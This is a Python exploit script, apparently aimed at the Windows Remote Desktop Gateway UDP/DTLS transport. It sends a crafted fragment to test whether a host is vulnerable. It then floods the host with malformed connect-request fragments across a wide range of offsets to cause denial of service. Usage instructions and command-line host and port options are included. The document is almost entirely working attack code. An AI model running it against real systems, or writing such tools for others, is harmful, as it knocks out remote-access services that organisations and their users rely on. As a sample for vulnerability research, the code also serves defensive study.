#!/usr/bin/env python3
from OpenSSL import SSL
from OpenSSL._util import (lib as _lib)
import socket
import struct
import select
import signal
import sys
import getopt

"""
python3 -m pip install pyOpenSSL
./exploit.py -h <host> -p <port>
"""

# PyOpenSSL doesn't expose the DTLS method to python, so we have to patch it
DTLSv1_METHOD = 7
SSL.Context._methods[DTLSv1_METHOD] = getattr(_lib, "DTLSv1_client_method")

class DOS_Exploit:

    def __init__(self, host: str, port: int, check_timeout=3):
        self._host = host
        self._port = port
        self._timeout = check_timeout
        self._ssl_context = SSL.Context(DTLSv1_METHOD)
        self._ssl_context.set_verify(SSL.VERIFY_NONE)
        self._packet_type = 5    # PKT_TYPE_CONNECT_REQ_FRAGMENT

    def create_ssl_socket(self) -> SSL.Connection:
        """
        create a new DTLS socket
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ssl_sock = SSL.Connection(self._ssl_context, sock)
        ssl_sock.connect((self._host, self._port))
        return ssl_sock

    def create_payload(self, fragment_id: int, num_fragments: int, fragment_bytes: bytes) -> bytes:
        """
        create a new fragment based on `https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsgu/518ad69a-429a-4f2f-93c2-757a89269bf2`
        """
        fragment_length = len(fragment_bytes)
        udp_pkt_hdr = struct.pack("<HH", self._packet_type, fragment_length + 2 + 2 + 2)
        fragment = udp_pkt_hdr + struct.pack("<HHH", fragment_id, num_fragments, fragment_length)
        fragment += fragment_bytes
        return fragment

    def check_vulnerable(self):
        """
        check if the server if vulnerable or not by setting num_fragments to 65
        """
        print("[*] Checking to see if the server is vulnerable")
        sock = self.create_ssl_socket()
        packet = self.create_payload(0, 65, b"a")
        sock.sendall(packet)
        # PyOpenSSL has timeout issues, connection may hang if socket can't recv
        read_ready, _, _ = select.select([sock], [], [], self._timeout)
        if read_ready:
            response = sock.recv(4096)
            if len(response) == 16:
                error = struct.unpack("<L", response[12:])[0]
                if error == 0x8000ffff:
                    return False

        return True

    def run(self, max_idx=0xffff):
        """
        throw the exploit on the target
        """
        print("[*] Running DOS exploit now")
        sock = self.create_ssl_socket()
        for offset in range(600, max_idx):
            packet = self.create_payload(offset, offset, b"a" * 1000)
            sock.sendall(packet)
        sock.close()


def main():
    opts, _ = getopt.getopt(sys.argv[1:], "h:p:")
    host = None
    port = None
    for opt in opts:
        if opt[0] == "-h":
            host = opt[1]
        else:
            port = int(opt[1])
    if not host or not port:
        print(f"Usage: python3 {sys.argv[0]} -h <host> -p <port>", file=sys.stderr)
        exit(1)

    exp = DOS_Exploit(host, port)
    if exp.check_vulnerable():
        print("[*] Server is exploitable")
        exp.run()
    else:
        print("[*] Server was not exploitable")


if __name__ == "__main__":
    main()
